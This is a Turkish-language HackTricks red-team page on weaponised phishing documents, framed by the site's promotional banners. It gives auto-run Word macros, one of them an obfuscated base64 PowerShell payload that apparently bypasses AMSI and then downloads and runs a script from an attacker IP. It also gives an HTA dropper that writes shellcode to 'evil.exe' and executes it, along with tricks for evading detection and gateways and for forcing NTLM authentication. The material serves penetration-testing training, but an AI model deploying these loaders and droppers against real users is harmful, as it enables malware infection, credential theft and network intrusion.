# Phishing Dosyaları ve Belgeleri

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter**'da takip edin 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya PR göndererek paylaşın**.

</details>

## Ofis Belgeleri

Microsoft Word, bir dosyayı açmadan önce dosya veri doğrulaması yapar. Veri doğrulaması, OfficeOpenXML standardına karşı veri yapısı tanımlama şeklinde gerçekleştirilir. Veri yapısı tanımlama sırasında herhangi bir hata oluşursa, analiz edilen dosya açılmaz.

Genellikle makrolar içeren Word dosyaları `.docm` uzantısını kullanır. Ancak, dosya uzantısını değiştirerek dosyanın adını değiştirmek ve hala makro yürütme yeteneklerini korumak mümkündür.\
Örneğin, RTF dosyası, tasarım gereği makroları desteklemez, ancak RTF olarak adlandırılan bir DOCM dosyası Microsoft Word tarafından işlenecek ve makro yürütme yeteneklerine sahip olacaktır.\
Aynı iç yapı ve mekanizmalar, Microsoft Office Suite'in diğer yazılımlarında da geçerlidir (Excel, PowerPoint vb.).

Aşağıdaki komutu kullanarak, bazı Office programları tarafından yürütülecek uzantıları kontrol edebilirsiniz:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX dosyaları, makrolar içeren uzaktan bir şablona (Dosya - Seçenekler - Eklentiler - Yönet: Şablonlar - Git) referans vererek makroları "çalıştırabilir".

### Harici Resim Yükleme

Git: _Ekle --> Hızlı Parçalar --> Alan_\
_**Kategoriler**: Bağlantılar ve Referanslar, **Alan Adları**: includePicture ve **Dosya Adı veya URL**:_ http://\<ip>/herhangi_birşey

![](<../../.gitbook/assets/image (316).png>)

### Makrolar Arka Kapı

Belgeden keyfi kod çalıştırmak için makroları kullanmak mümkündür.

#### Otomatik Yükleme Fonksiyonları

Ne kadar yaygın olurlarsa, AV tarafından tespit edilme olasılıkları o kadar yüksek olur.

* AutoOpen()
* Document\_Open()

#### Makro Kodu Örnekleri
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Meta verileri manuel olarak kaldırma

**Dosya > Bilgi > Belgeyi İncele > Belgeyi İncele** yolunu izleyin, bu Belge Denetleyicisini açacaktır. **İncele**'ye tıklayın ve ardından **Belge Özellikleri ve Kişisel Bilgiler** yanındaki **Tümünü Kaldır**'a tıklayın.

#### Doc Uzantısı

Tamamlandığında, **Farklı Kaydet** açılır menüsünden **.docx** formatını **Word 97-2003 `.doc`** olarak değiştirin.\
Bunu yapmanızın nedeni, **makroları `.docx` içine kaydedememeniz** ve makro destekli **`.docm`** uzantısının bir **stigmaya** sahip olmasıdır (örneğin, küçük resim simgesinde büyük bir `!` işareti bulunur ve bazı web/e-posta geçitleri bunları tamamen engeller). Bu nedenle, bu **eski `.doc` uzantısı en iyi uzlaşmadır**.

#### Zararlı Makro Oluşturucuları

* MacOS
* [**macphish**](https://github.com/cldrn/macphish)
* [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA Dosyaları

Bir HTA, HTML ve VBScript ve JScript gibi betik dillerini birleştiren bir Windows programıdır. Kullanıcı arayüzünü oluşturur ve bir tarayıcının güvenlik modelinin kısıtlamaları olmadan "tamamen güvenilir" bir uygulama olarak çalışır.

Bir HTA, genellikle **Internet Explorer** ile birlikte **kurulan** **`mshta.exe`** kullanılarak çalıştırılır, bu nedenle **`mshta` IE'ye bağımlıdır**. Bu nedenle, IE kaldırıldıysa, HTA'lar çalıştırılamaz.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM Kimlik Doğrulamasını Zorlama

**NTLM kimlik doğrulamasını "uzaktan" zorlamak için** birkaç yol vardır, örneğin, kullanıcıya erişeceği e-postalara veya HTML'e **görünmez resimler** ekleyebilirsiniz (hatta HTTP MitM ile?). Veya kurbanı, yalnızca **klasörü açmak için** bir **kimlik doğrulaması tetikleyecek** dosyaların adresini gönderebilirsiniz.

**Bu fikirleri ve daha fazlasını aşağıdaki sayfalarda kontrol edin:**

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md" %}
[places-to-steal-ntlm-creds.md](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)
{% endcontent-ref %}

### NTLM Aktarımı

Unutmayın, sadece hash'i veya kimlik doğrulamasını çalmakla kalmaz, aynı zamanda **NTLM aktarım saldırıları** da gerçekleştirebilirsiniz:

* [**NTLM Aktarım Saldırıları**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
* [**AD CS ESC8 (Sertifikalara NTLM aktarımı)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hackleme öğrenin<strong>!</strong></summary>

* Bir **cybersecurity şirketinde mi çalışıyorsunuz**? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzdaki özel [**NFT'leri**](https://opensea.io/collection/the-peass-family) keşfedin
* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter**'da beni takip edin 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya PR göndererek paylaşın**.

</details>
